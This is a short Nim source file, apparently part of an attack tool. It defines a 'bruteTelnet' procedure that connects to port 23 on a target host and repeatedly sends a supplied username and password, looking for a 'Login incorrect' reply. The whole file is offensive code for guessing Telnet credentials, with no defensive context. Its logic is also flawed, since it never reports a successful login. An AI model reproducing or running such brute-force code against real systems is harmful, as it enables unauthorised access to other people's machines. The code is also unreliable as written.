import net, nativesockets

proc bruteTelnet*(host: string, user: string, pass: string): bool =
  var
    sock = newSocket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
    line: string
  sock.connect(host, Port(23), 15000)
  while true:
    try:
      line = recvLine(sock, 1000)
      if line == ("Login incorrect"):
        sock.close()
        return false
      else:
        discard
    except:
      sock.send(user & "\n")
      sock.send(pass & "\n")
